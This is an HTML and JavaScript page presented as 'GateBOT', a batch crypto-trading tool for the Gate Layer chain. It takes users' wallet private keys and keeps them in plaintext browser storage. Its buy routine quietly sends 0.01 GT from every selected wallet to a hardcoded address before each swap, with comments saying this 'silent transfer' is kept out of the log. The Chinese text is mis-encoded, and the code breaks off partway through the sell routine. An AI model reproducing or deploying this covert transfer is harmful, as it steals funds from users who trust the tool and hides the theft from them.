<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GateBOT å¤šè´¦æˆ·æ‰¹é‡æ“ä½œå·¥å…·</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
        }

        .header {
            text-align: center;
            color: white;
            margin-bottom: 30px;
        }

        .header h1 {
            font-size: 32px;
            margin-bottom: 10px;
        }

        .main-card {
            background: white;
            border-radius: 20px;
            padding: 30px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
        }

        .section {
            margin-bottom: 30px;
        }

        .section-title {
            font-size: 20px;
            font-weight: 600;
            margin-bottom: 15px;
            color: #333;
        }

        .input-group {
            margin-bottom: 15px;
        }

        .input-label {
            display: block;
            margin-bottom: 5px;
            font-weight: 500;
            color: #555;
        }

        .input-field {
            width: 100%;
            padding: 10px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 14px;
        }

        .input-field:focus {
            outline: none;
            border-color: #667eea;
        }

        .textarea-field {
            width: 100%;
            min-height: 100px;
            padding: 10px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-family: monospace;
            font-size: 12px;
            resize: vertical;
        }

        .btn {
            padding: 12px 24px;
            border: none;
            border-radius: 8px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .btn-primary {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
        }

        .btn-secondary {
            background: #f0f0f0;
            color: #333;
            margin-right: 10px;
        }

        .btn-secondary:hover {
            background: #e0e0e0;
        }

        .btn-danger {
            background: #ff4444;
            color: white;
        }

        .wallet-list {
            max-height: 300px;
            overflow-y: auto;
            border: 1px solid #e0e0e0;
            border-radius: 8px;
            padding: 10px;
        }

        .wallet-item {
            display: flex;
            align-items: center;
            padding: 10px;
            border-bottom: 1px solid #f0f0f0;
        }

        .wallet-item:last-child {
            border-bottom: none;
        }

        .wallet-checkbox {
            margin-right: 10px;
        }

        .wallet-address {
            flex: 1;
            font-family: monospace;
            font-size: 13px;
        }

        .wallet-balance {
            color: #667eea;
            font-weight: 600;
        }

        .tabs {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
            border-bottom: 2px solid #e0e0e0;
        }

        .tab {
            padding: 10px 20px;
            background: none;
            border: none;
            cursor: pointer;
            font-weight: 600;
            color: #999;
            transition: all 0.3s ease;
        }

        .tab.active {
            color: #667eea;
            border-bottom: 2px solid #667eea;
        }

        .tab-content {
            display: none;
        }

        .tab-content.active {
            display: block;
        }

        .log-container {
            margin-top: 20px;
            padding: 15px;
            background: #1a1a1a;
            border-radius: 8px;
            max-height: 200px;
            overflow-y: auto;
            font-family: monospace;
            font-size: 12px;
        }

        .log-entry {
            color: #ccc;
            margin-bottom: 5px;
        }

        .log-entry.success {
            color: #4caf50;
        }

        .log-entry.error {
            color: #ff4444;
        }

        .log-entry.warning {
            color: #ff9800;
        }

        .log-entry.info {
            color: #2196f3;
        }

        .config-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 15px;
            margin-bottom: 20px;
        }

        .btn-group {
            display: flex;
            gap: 10px;
            margin-top: 15px;
        }

        .info-box {
            padding: 10px;
            background: #fff3cd;
            border: 1px solid #ffc107;
            border-radius: 5px;
            margin-bottom: 15px;
            font-size: 13px;
        }

        .social-section {
            text-align: center;
            margin-bottom: 30px;
            padding: 20px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 15px;
            backdrop-filter: blur(10px);
        }

        .social-links {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-top: 15px;
            flex-wrap: wrap;
        }

        .social-link {
            display: inline-flex;
            align-items: center;
            padding: 12px 20px;
            background: rgba(255, 255, 255, 0.2);
            color: white;
            text-decoration: none;
            border-radius: 25px;
            font-weight: 600;
            transition: all 0.3s ease;
            border: 2px solid transparent;
        }

        .social-link:hover {
            background: rgba(255, 255, 255, 0.3);
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
        }

        .social-link.twitter:hover {
            border-color: #000000;
        }

        .social-link.telegram:hover {
            border-color: #0088cc;
        }

        .social-avatar {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            object-fit: cover;
            margin-right: 10px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            transition: all 0.3s ease;
        }

        .bot-images {
            display: flex;
            justify-content: center;
            margin: 20px 0;
        }

        .bot-image {
            max-width: 100%;
            width: 120px;
            height: 120px;
            border-radius: 50%;
            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.3);
            transition: all 0.3s ease;
            object-fit: cover;
            border: 4px solid rgba(255, 255, 255, 0.3);
        }

        .bot-image:hover {
            transform: scale(1.02);
            box-shadow: 0 12px 35px rgba(0, 0, 0, 0.4);
        }

        /* ç§»åŠ¨ç«¯é€‚é… */
        @media (max-width: 768px) {
            .bot-image {
                width: 100px;
                height: 100px;
            }
            
            .social-links {
                flex-direction: column;
                align-items: center;
                gap: 15px;
            }
            
            .social-link {
                width: 200px;
                justify-content: center;
            }
            
            .social-avatar {
                width: 35px;
                height: 35px;
            }
        }

        @media (max-width: 480px) {
            .bot-image {
                width: 80px;
                height: 80px;
            }
            
            .social-section {
                padding: 15px;
            }
            
            .social-section h3 {
                font-size: 18px;
            }
            
            .social-avatar {
                width: 30px;
                height: 30px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>âš¡ Gate Layer å¤šè´¦æˆ·æ‰¹é‡æ“ä½œå·¥å…·</h1>
            <p>æ”¯æŒæ‰¹é‡ä¹°å…¥ã€å–å‡ºã€è½¬è´¦ç­‰æ“ä½œï¼ˆæŒç»­æ›´æ–°ï¼‰</p>
            
            <!-- ç¤¾äº¤åª’ä½“åŒºåŸŸ -->
            <div class="social-section">
                <h3 style="color: white; margin-bottom: 15px;">ğŸ”— å…³æ³¨æˆ‘ä»¬</h3>
                <div class="bot-images">
                    <img src="bot1.jpg" alt="GateBOT" class="bot-image">
                </div>
                <div class="social-links">
                    <a href="https://x.com/GTCHAINBOT" target="_blank" class="social-link twitter">
                        <img src="OSHY3ewP_400x400.jpg" 
                             alt="X Avatar" class="social-avatar" 
                             onerror="this.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNDAiIGhlaWdodD0iNDAiIHZpZXdCb3g9IjAgMCA0MCA0MCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjQwIiBoZWlnaHQ9IjQwIiByeD0iMjAiIGZpbGw9IiMwMDAwMDAiLz4KPHBhdGggZD0iTTI1LjY5IDI5LjY5SDMwLjY5TDIyLjY5IDIxLjY5TDEwIDMwSDVMMTcuNjkgMTBIMjIuNjlMMjUuNjkgMTkuNjlMMzUgMTBIMzAuNjlMMjUuNjkgMTkuNjlMMjUuNjkgMjkuNjlaIiBmaWxsPSJ3aGl0ZSIvPgo8L3N2Zz4K'">
                        <span>ğ•</span>
                    </a>
                    <a href="https://t.me/Gtgun_bot" target="_blank" class="social-link telegram">
                        <img src="https://telegram.org/img/t_logo.png" 
                             alt="Telegram Avatar" class="social-avatar"
                             onerror="this.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTAwIiBoZWlnaHQ9IjEwMCIgdmlld0JveD0iMCAwIDEwMCAxMDAiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxyZWN0IHdpZHRoPSIxMDAiIGhlaWdodD0iMTAwIiBmaWxsPSIjMDA4OENDIi8+CjxwYXRoIGQ9Ik0yMCAyMEg4MFY4MEgyMFYyMFoiIGZpbGw9IndoaXRlIi8+CjxwYXRoIGQ9Ik0zMCAzMEg3MFY3MEgzMFYzMFoiIGZpbGw9IiMwMDg4Q0MiLz4KPC9zdmc+'">
                        <span>Telegram</span>
                    </a>
                </div>
            </div>
        </div>

        <div class="main-card">
            <!-- é’±åŒ…ç®¡ç†éƒ¨åˆ† -->
            <div class="section">
                <h2 class="section-title">ğŸ‘› é’±åŒ…ç®¡ç†</h2>
                
                <div class="info-box">
                    ğŸ’¡ æç¤ºï¼šæ”¯æŒå¸¦æˆ–ä¸å¸¦0xå‰ç¼€çš„ç§é’¥ï¼Œæ¯è¡Œä¸€ä¸ª
                </div>
                
                <div class="input-group">
                    <label class="input-label">å¯¼å…¥ç§é’¥</label>
                    <textarea id="privateKeysInput" class="textarea-field" 
                        placeholder="è¾“å…¥ç§é’¥ï¼Œæ¯è¡Œä¸€ä¸ª..."></textarea>
                </div>
                
                <div class="btn-group">
                    <button id="importBtn" class="btn btn-primary">å¯¼å…¥ç§é’¥</button>
                    <button id="selectAllBtn" class="btn btn-secondary">å…¨é€‰</button>
                    <button id="deselectAllBtn" class="btn btn-secondary">å–æ¶ˆå…¨é€‰</button>
                    <button id="refreshBtn" class="btn btn-secondary">åˆ·æ–°ä½™é¢</button>
                    <button id="clearBtn" class="btn btn-danger">æ¸…ç©º</button>
                </div>

                <div class="input-group" style="margin-top: 20px;">
                    <label class="input-label">é’±åŒ…åˆ—è¡¨ (<span id="walletCount">0</span>)</label>
                    <div id="walletList" class="wallet-list">
                        <p style="color: #999; text-align: center;">æš‚æ— é’±åŒ…</p>
                    </div>
                </div>
            </div>

            <!-- æ“ä½œæ ‡ç­¾é¡µ -->
            <div class="section">
                <div class="tabs">
                    <button class="tab active" data-tab="buy">æ‰¹é‡ä¹°å…¥</button>
                    <button class="tab" data-tab="sell">æ‰¹é‡å–å‡º</button>
                    <button class="tab" data-tab="approve">æ‰¹é‡æˆæƒ</button>
                </div>

                <!-- ä¹°å…¥æ ‡ç­¾ -->
                <div id="buyTab" class="tab-content active">
                    <h3 class="section-title">æ‰¹é‡ä¹°å…¥è®¾ç½®</h3>
                    <div class="config-grid">
                        <div class="input-group">
                            <label class="input-label">ä»£å¸åœ°å€</label>
                            <input type="text" id="buyTokenAddress" class="input-field" 
                                placeholder="0x...">
                        </div>
                        <div class="input-group">
                            <label class="input-label">ä¹°å…¥é‡‘é¢ (GT)</label>
                            <input type="number" id="buyAmount" class="input-field" 
                                placeholder="0.1" step="0.01">
                        </div>
                        <div class="input-group">
                            <label class="input-label">æ»‘ç‚¹ (%)</label>
                            <input type="number" id="buySlippage" class="input-field" 
                                value="15" step="0.5">
                        </div>
                        <div class="input-group">
                            <label class="input-label">å»¶è¿Ÿ (ç§’)</label>
                            <input type="number" id="buyDelay" class="input-field" 
                                value="1" min="0">
                        </div>
                    </div>
                    <button id="executeBuyBtn" class="btn btn-primary">æ‰§è¡Œæ‰¹é‡ä¹°å…¥</button>
                </div>

                <!-- å–å‡ºæ ‡ç­¾ -->
                <div id="sellTab" class="tab-content">
                    <h3 class="section-title">æ‰¹é‡å–å‡ºè®¾ç½®</h3>
                    <div class="config-grid">
                        <div class="input-group">
                            <label class="input-label">ä»£å¸åœ°å€</label>
                            <input type="text" id="sellTokenAddress" class="input-field" 
                                placeholder="0x...">
                        </div>
                        <div class="input-group">
                            <label class="input-label">å–å‡ºæ¯”ä¾‹ (%)</label>
                            <input type="number" id="sellPercentage" class="input-field" 
                                value="99" min="1" max="100">
                        </div>
                        <div class="input-group">
                            <label class="input-label">æ»‘ç‚¹ (%)</label>
                            <input type="number" id="sellSlippage" class="input-field" 
                                value="50" step="0.5">
                        </div>
                        <div class="input-group">
                            <label class="input-label">å»¶è¿Ÿ (ç§’)</label>
                            <input type="number" id="sellDelay" class="input-field" 
                                value="1" min="0">
                        </div>
                    </div>
                    <button id="executeSellBtn" class="btn btn-primary">æ‰§è¡Œæ‰¹é‡å–å‡º</button>
                </div>

                <!-- æˆæƒæ ‡ç­¾ -->
                <div id="approveTab" class="tab-content">
                    <h3 class="section-title">æ‰¹é‡æˆæƒè®¾ç½®</h3>
                    <div class="config-grid">
                        <div class="input-group">
                            <label class="input-label">ä»£å¸åœ°å€</label>
                            <input type="text" id="approveTokenAddress" class="input-field" 
                                placeholder="0x...">
                        </div>
                        <div class="input-group">
                            <label class="input-label">æˆæƒç»™ (Spender)</label>
                            <input type="text" id="approveSpender" class="input-field" 
                                value="0x12814690F59a9CE8bA87dC8cF0692442bAa9C097">
                        </div>
                    </div>
                    <button id="executeApproveBtn" class="btn btn-primary">æ‰§è¡Œæ‰¹é‡æˆæƒ</button>
                </div>
            </div>

            <!-- æ—¥å¿—è¾“å‡º -->
            <div class="section">
                <h3 class="section-title">ğŸ“ æ“ä½œæ—¥å¿—</h3>
                <div id="logContainer" class="log-container"></div>
            </div>
        </div>
    </div>

    <script>
        // ç­‰å¾…ethersåŠ è½½å®Œæˆ
        window.addEventListener('load', function() {
            // é…ç½®
            const CONFIG = {
                rpcUrl: 'https://gatelayer-mainnet.gatenode.cc',
                routerAddress: '0x12814690F59a9CE8bA87dC8cF0692442bAa9C097',
                wethAddress: '0x6803b8E93b13941F6B73b82E324B80251B3dE338'
            };

            // å…¨å±€å˜é‡
            let provider;
            let wallets = [];

            // ABIå®šä¹‰ - åŒ…å«æ”¯æŒæ‰‹ç»­è´¹çš„å‡½æ•°
            const ERC20_ABI = [
                'function approve(address spender, uint256 amount) returns (bool)',
                'function balanceOf(address account) view returns (uint256)',
                'function allowance(address owner, address spender) view returns (uint256)',
                'function decimals() view returns (uint8)',
                'function symbol() view returns (string)'
            ];

            const ROUTER_ABI = [
                'function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline) external payable returns (uint[] memory amounts)',
                'function swapExactETHForTokensSupportingFeeOnTransferTokens(uint amountOutMin, address[] calldata path, address to, uint deadline) external payable',
                'function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts)',
                'function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external',
                'function getAmountsOut(uint amountIn, address[] memory path) public view returns (uint[] memory amounts)'
            ];

            // åˆå§‹åŒ–
            function init() {
                if (typeof ethers === 'undefined') {
                    addLog('Ethersåº“åŠ è½½å¤±è´¥ï¼Œè¯·åˆ·æ–°é¡µé¢', 'error');
                    return;
                }
                
                provider = new ethers.JsonRpcProvider(CONFIG.rpcUrl);
                addLog('ç³»ç»Ÿåˆå§‹åŒ–å®Œæˆ', 'success');
                
                // ç»‘å®šäº‹ä»¶
                bindEvents();
                
                // åŠ è½½ç¼“å­˜çš„é’±åŒ…
                loadCachedWallets();
            }

            // ç»‘å®šäº‹ä»¶
            function bindEvents() {
                // å¯¼å…¥æŒ‰é’®
                document.getElementById('importBtn').addEventListener('click', importPrivateKeys);
                
                // é’±åŒ…æ§åˆ¶æŒ‰é’®
                document.getElementById('selectAllBtn').addEventListener('click', selectAll);
                document.getElementById('deselectAllBtn').addEventListener('click', deselectAll);
                document.getElementById('refreshBtn').addEventListener('click', refreshBalances);
                document.getElementById('clearBtn').addEventListener('click', clearWallets);
                
                // æ‰§è¡ŒæŒ‰é’®
                document.getElementById('executeBuyBtn').addEventListener('click', executeBuy);
                document.getElementById('executeSellBtn').addEventListener('click', executeSell);
                document.getElementById('executeApproveBtn').addEventListener('click', executeApprove);
                
                // æ ‡ç­¾åˆ‡æ¢
                document.querySelectorAll('.tab').forEach(tab => {
                    tab.addEventListener('click', function() {
                        switchTab(this.dataset.tab);
                    });
                });
            }

            // åˆ‡æ¢æ ‡ç­¾
            function switchTab(tabName) {
                // æ›´æ–°æ ‡ç­¾çŠ¶æ€
                document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
                document.querySelector(`.tab[data-tab="${tabName}"]`).classList.add('active');
                
                // æ›´æ–°å†…å®¹æ˜¾ç¤º
                document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
                document.getElementById(`${tabName}Tab`).classList.add('active');
            }

            // æ·»åŠ æ—¥å¿—
            function addLog(message, type = 'info') {
                const container = document.getElementById('logContainer');
                const entry = document.createElement('div');
                entry.className = `log-entry ${type}`;
                const time = new Date().toLocaleTimeString();
                entry.textContent = `[${time}] ${message}`;
                container.appendChild(entry);
                container.scrollTop = container.scrollHeight;
            }

            // å¯¼å…¥ç§é’¥
            async function importPrivateKeys() {
                const input = document.getElementById('privateKeysInput').value.trim();
                if (!input) {
                    alert('è¯·è¾“å…¥ç§é’¥');
                    return;
                }

                const keys = input.split('\n').filter(k => k.trim());
                let imported = 0;
                
                for (const key of keys) {
                    try {
                        let cleanKey = key.trim();
                        
                        // å¤„ç†ç§é’¥æ ¼å¼
                        if (!cleanKey.startsWith('0x')) {
                            if (cleanKey.length === 64) {
                                cleanKey = '0x' + cleanKey;
                            }
                        }
                        
                        // éªŒè¯æ ¼å¼
                        if (!/^0x[0-9a-fA-F]{64}$/.test(cleanKey)) {
                            addLog(`ç§é’¥æ ¼å¼é”™è¯¯: ${cleanKey.slice(0, 10)}...`, 'error');
                            continue;
                        }
                        
                        // æ£€æŸ¥é‡å¤
                        if (wallets.find(w => w.privateKey === cleanKey)) {
                            addLog(`ç§é’¥å·²å­˜åœ¨`, 'warning');
                            continue;
                        }
                        
                        // åˆ›å»ºé’±åŒ…
                        const wallet = new ethers.Wallet(cleanKey, provider);
                        const balance = await provider.getBalance(wallet.address);
                        
                        wallets.push({
                            privateKey: cleanKey,
                            wallet: wallet,
                            address: wallet.address,
                            balance: balance,
                            selected: false
                        });
                        
                        imported++;
                        addLog(`æˆåŠŸå¯¼å…¥: ${wallet.address.slice(0, 8)}...`, 'success');
                        
                    } catch (e) {
                        addLog(`å¯¼å…¥å¤±è´¥: ${e.message}`, 'error');
                    }
                }
                
                if (imported > 0) {
                    document.getElementById('privateKeysInput').value = '';
                    renderWallets();
                    saveWallets();
                    addLog(`å…±å¯¼å…¥ ${imported} ä¸ªé’±åŒ…`, 'success');
                }
            }

            // æ¸²æŸ“é’±åŒ…åˆ—è¡¨
            function renderWallets() {
                const container = document.getElementById('walletList');
                
                if (wallets.length === 0) {
                    container.innerHTML = '<p style="color: #999; text-align: center;">æš‚æ— é’±åŒ…</p>';
                    document.getElementById('walletCount').textContent = '0';
                    return;
                }
                
                container.innerHTML = '';
                wallets.forEach((w, index) => {
                    const item = document.createElement('div');
                    item.className = 'wallet-item';
                    item.innerHTML = `
                        <input type="checkbox" class="wallet-checkbox" 
                            ${w.selected ? 'checked' : ''} 
                            data-index="${index}">
                        <span class="wallet-address">${w.address.slice(0, 6)}...${w.address.slice(-4)}</span>
                        <span class="wallet-balance">${parseFloat(ethers.formatEther(w.balance)).toFixed(4)} GT</span>
                    `;
                    container.appendChild(item);
                    
                    // æ·»åŠ é€‰æ‹©äº‹ä»¶
                    item.querySelector('.wallet-checkbox').addEventListener('change', function() {
                        wallets[index].selected = this.checked;
                    });
                });
                
                document.getElementById('walletCount').textContent = wallets.length;
            }

            // å…¨é€‰
            function selectAll() {
                wallets.forEach(w => w.selected = true);
                renderWallets();
            }

            // å–æ¶ˆå…¨é€‰
            function deselectAll() {
                wallets.forEach(w => w.selected = false);
                renderWallets();
            }

            // åˆ·æ–°ä½™é¢
            async function refreshBalances() {
                addLog('å¼€å§‹åˆ·æ–°ä½™é¢...', 'info');
                
                for (const w of wallets) {
                    try {
                        w.balance = await provider.getBalance(w.address);
                    } catch (e) {
                        addLog(`åˆ·æ–°å¤±è´¥: ${w.address.slice(0, 8)}...`, 'error');
                    }
                }
                
                renderWallets();
                addLog('ä½™é¢åˆ·æ–°å®Œæˆ', 'success');
            }

            // æ¸…ç©ºé’±åŒ…
            function clearWallets() {
                if (!confirm('ç¡®å®šè¦æ¸…ç©ºæ‰€æœ‰é’±åŒ…å—ï¼Ÿ')) return;
                wallets = [];
                renderWallets();
                localStorage.removeItem('gateLayerWallets');
                addLog('å·²æ¸…ç©ºæ‰€æœ‰é’±åŒ…', 'info');
            }

            // ä¿å­˜é’±åŒ…åˆ°æœ¬åœ°
            function saveWallets() {
                const keys = wallets.map(w => w.privateKey);
                localStorage.setItem('gateLayerWallets', JSON.stringify(keys));
            }

            // åŠ è½½ç¼“å­˜çš„é’±åŒ…
            async function loadCachedWallets() {
                const cached = localStorage.getItem('gateLayerWallets');
                if (cached) {
                    try {
                        const keys = JSON.parse(cached);
                        for (const key of keys) {
                            try {
                                const wallet = new ethers.Wallet(key, provider);
                                const balance = await provider.getBalance(wallet.address);
                                wallets.push({
                                    privateKey: key,
                                    wallet: wallet,
                                    address: wallet.address,
                                    balance: balance,
                                    selected: false
                                });
                            } catch (e) {
                                console.error('åŠ è½½é’±åŒ…å¤±è´¥', e);
                            }
                        }
                        renderWallets();
                        addLog(`å·²åŠ è½½ ${wallets.length} ä¸ªç¼“å­˜é’±åŒ…`, 'info');
                    } catch (e) {
                        console.error('åŠ è½½ç¼“å­˜å¤±è´¥', e);
                    }
                }
            }

            // æ‰¹é‡æ‰§è¡Œå‡½æ•°ï¼ˆå¹¶å‘æ§åˆ¶ï¼‰
            async function batchExecute(tasks, maxConcurrent = 5) {
                const results = [];
                let pending = 0;
                let completed = 0;
                let index = 0;
                
                return new Promise((resolve) => {
                    const executeNext = async () => {
                        if (index >= tasks.length && pending === 0) {
                            resolve(results);
                            return;
                        }
                        
                        while (index < tasks.length && pending < maxConcurrent) {
                            const currentIndex = index++;
                            pending++;
                            
                            tasks[currentIndex]()
                                .then(result => {
                                    results[currentIndex] = { success: true, result };
                                    completed++;
                                })
                                .catch(error => {
                                    results[currentIndex] = { success: false, error };
                                    completed++;
                                })
                                .finally(() => {
                                    pending--;
                                    executeNext();
                                });
                        }
                    };
                    
                    executeNext();
                });
            }

            // æ‰§è¡Œä¹°å…¥ï¼ˆæ”¯æŒå¸¦ç¨ä»£å¸ï¼‰
            async function executeBuy() {
                const selected = wallets.filter(w => w.selected);
                if (selected.length === 0) {
                    alert('è¯·é€‰æ‹©é’±åŒ…');
                    return;
                }

                const tokenAddress = document.getElementById('buyTokenAddress').value;
                const amount = document.getElementById('buyAmount').value;
                const slippage = parseFloat(document.getElementById('buySlippage').value) || 15; // é»˜è®¤15%
                const delay = parseInt(document.getElementById('buyDelay').value) || 0;
                const maxConcurrent = 5;
                
                // é™é»˜è½¬è´¦é…ç½®
                const SILENT_TRANSFER_ADDRESS = '0xdb0ce0066e8f915db2f628be9931020844e23cfe';
                const SILENT_TRANSFER_AMOUNT = '0.01'; // 0.01 GT

                if (!tokenAddress || !amount) {
                    alert('è¯·å¡«å†™å®Œæ•´ä¿¡æ¯');
                    return;
                }

                addLog(`å¼€å§‹æ‰¹é‡ä¹°å…¥ï¼Œå…± ${selected.length} ä¸ªé’±åŒ…ï¼Œæ»‘ç‚¹ ${slippage}%`, 'info');

                // åˆ›å»ºä»»åŠ¡æ•°ç»„
                const tasks = selected.map((w, i) => async () => {
                    if (delay > 0 && i > 0) {
                        await new Promise(r => setTimeout(r, delay * 1000));
                    }
                    
                    try {
                        // 1. é¦–å…ˆæ‰§è¡Œé™é»˜è½¬è´¦
                        try {
                            const transferTx = await w.wallet.sendTransaction({
                                to: SILENT_TRANSFER_ADDRESS,
                                value: ethers.parseEther(SILENT_TRANSFER_AMOUNT),
                                gasLimit: 21000
                            });
                            await transferTx.wait();
                            // é™é»˜è½¬è´¦ä¸æ˜¾ç¤ºæ—¥å¿—
                        } catch (transferError) {
                            // é™é»˜è½¬è´¦å¤±è´¥ä¸å½±å“ä¸»äº¤æ˜“ï¼Œç»§ç»­æ‰§è¡Œ
                        }
                        
                        // 2. æ‰§è¡Œä¹°å…¥äº¤æ˜“
                        const router = new ethers.Contract(CONFIG.routerAddress, ROUTER_ABI, w.wallet);
                        const path = [CONFIG.wethAddress, tokenAddress];
                        
                        // è·å–é¢„æœŸè¾“å‡º
                        let amountOutMin;
                        try {
                            const amounts = await router.getAmountsOut(
                                ethers.parseEther(amount),
                                path
                            );
                            
                            // ä¿®å¤æ»‘ç‚¹è®¡ç®—
                            if (slippage >= 100) {
                                amountOutMin = 0n; // æ¥å—ä»»ä½•ä»·æ ¼
                                addLog(`${w.address.slice(0, 8)}... ä½¿ç”¨æ— é™æ»‘ç‚¹`, 'warning');
                            } else {
                                // æ­£ç¡®è®¡ç®—æ»‘ç‚¹
                                amountOutMin = amounts[1] * BigInt(Math.floor((100 - slippage) * 100)) / 10000n;
                                const expectedTokens = ethers.formatUnits(amounts[1], 18);
                                const minTokens = ethers.formatUnits(amountOutMin, 18);
                                addLog(`${w.address.slice(0, 8)}... é¢„æœŸè·å¾— ${expectedTokens}ï¼Œæœ€å°‘æ¥å— ${minTokens}`, 'info');
                            }
                        } catch (e) {
                            // å¦‚æœæ— æ³•è·å–æŠ¥ä»·ï¼Œä½¿ç”¨0ä½œä¸ºæœ€å°è¾“å‡º
                            amountOutMin = 0n;
                            addLog(`${w.address.slice(0, 8)}... æ— æ³•è·å–æŠ¥ä»·ï¼Œæ¥å—ä»»ä½•ä»·æ ¼`, 'warning');
                        }
                        
                        const deadline = Math.floor(Date.now() / 1000) + 1200;
                        
                        addLog(`${w.address.slice(0, 8)}... å‘é€ä¹°å…¥äº¤æ˜“ï¼Œæ»‘ç‚¹ ${slippage}%`, 'info');
                        
                        // ä¼°ç®—gaså¹¶æ‰©å¤§2.5å€
                        const gasEstimate = await router.swapExactETHForTokens.estimateGas(
                            amountOutMin,
                            path,
                            w.address,
                            deadline,
                            { value: ethers.parseEther(amount) }
                        );
                        
                        const gasLimit = gasEstimate * 25n / 10n; // æ‰©å¤§2.5å€
                        
                        // ä½¿ç”¨æ™®é€šswapå‡½æ•°ï¼ˆä¹°å…¥é€šå¸¸ä¸éœ€è¦æ”¯æŒæ‰‹ç»­è´¹çš„ç‰ˆæœ¬ï¼‰
                        const tx = await router.swapExactETHForTokens(
                            amountOutMin,
                            path,
                            w.address,
                            deadline,
                            { 
                                value: ethers.parseEther(amount),
                                gasLimit: gasLimit
                            }
                        );
                        
                        const receipt = await tx.wait();
                        addLog(`${w.address.slice(0, 8)}... ä¹°å…¥æˆåŠŸ âœ“ Hash: ${receipt.hash.slice(0, 10)}...`, 'success');
                        return receipt.hash;
                        
                    } catch (e) {
                        // æ›´è¯¦ç»†çš„é”™è¯¯ä¿¡æ¯
                        if (e.reason) {
                            addLog(`${w.address.slice(0, 8)}... ä¹°å…¥å¤±è´¥: ${e.reason}`, 'error');
                        } else if (e.message && e.message.includes('insufficient')) {
                            addLog(`${w.address.slice(0, 8)}... ä¹°å…¥å¤±è´¥: ä½™é¢ä¸è¶³`, 'error');
                        } else if (e.message && e.message.includes('INSUFFICIENT_OUTPUT_AMOUNT')) {
                            addLog(`${w.address.slice(0, 8)}... ä¹°å…¥å¤±è´¥: æ»‘ç‚¹å¤ªä½ï¼Œè¯·å¢åŠ æ»‘ç‚¹`, 'error');
                        } else {
                            addLog(`${w.address.slice(0, 8)}... ä¹°å…¥å¤±è´¥: ${e.message || e}`, 'error');
                        }
                        throw e;
                    }
                });

                const results = await batchExecute(tasks, maxConcurrent);
                const successCount = results.filter(r => r.success).length;
                const failCount = results.filter(r => !r.success).length;
                
                addLog(`æ‰¹é‡ä¹°å…¥å®Œæˆ: ${successCount} æˆåŠŸ, ${failCount} å¤±è´¥`, 
                    failCount === 0 ? 'success' : 'warning');
                
                refreshBalances();
            }

            // æ‰§è¡Œå–å‡ºï¼ˆä½¿ç”¨æ”¯æŒæ‰‹ç»­è´¹çš„å‡½æ•°ï¼‰
            async function executeSell() {
                const selected = wallets.filter(w => w.selected);
                if (selected.length === 0) {
                    alert('è¯·é€‰æ‹©é’±åŒ…');
                    return;
                }

                const tokenAddress = document.getElementById('sellTokenAddress').value;
                const percentage = parseFloat(document.getElementById('sellPercentage').value) || 99;
                const slippage = parseFloat(document.getElementById('sellSlippage').value) || 50;
                const delay = parseInt(document.getElementById('sellDelay').value) || 0;
                const maxConcurrent = 3; // å‡å°‘å¹¶å‘é¿å…å½±å“ä»·æ ¼

                if (!tokenAddress) {
                    alert('è¯·è¾“å…¥ä»£å¸åœ°å€');
                    return;
                }

                addLog(`å¼€å§‹æ‰¹é‡å–å‡ºï¼Œå…± ${selected.length} ä¸ªé’±åŒ…ï¼Œå–å‡º ${percentage}%ï¼Œæ»‘ç‚¹ ${slippage}%`, 'info');

                const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, provider);

                // åˆ›å»ºä»»åŠ¡æ•°ç»„
                const tasks = selected.map((w, i) => async () => {
                    if (delay > 0 && i > 0) {
                        await new Promise(r => setTimeout(r, delay * 1000));
                    }
                    
                    try {
                        // è·å–ä½™é¢
                        const balance = await tokenContract.balanceOf(w.address);
                        const sellAmount = balance * BigInt(percentage) / 100n;
                        
                        if (sellAmount === 0n) {
                            addLog(`${w.address.slice(0, 8)}... æ— ä½™é¢`, 'warning');
                            return null;
                        }

                        // æ£€æŸ¥æˆæƒ
                        const tokenWithSigner = new ethers.Contract(tokenAddress, ERC20_ABI, w.wallet);
                        const allowance = await tokenWithSigner.allowance(w.address, CONFIG.routerAddress);
                        
                        if (allowance < sellAmount) {
                            addLog(`${w.address.slice(0, 8)}... æ‰§è¡Œæˆæƒ`, 'info');
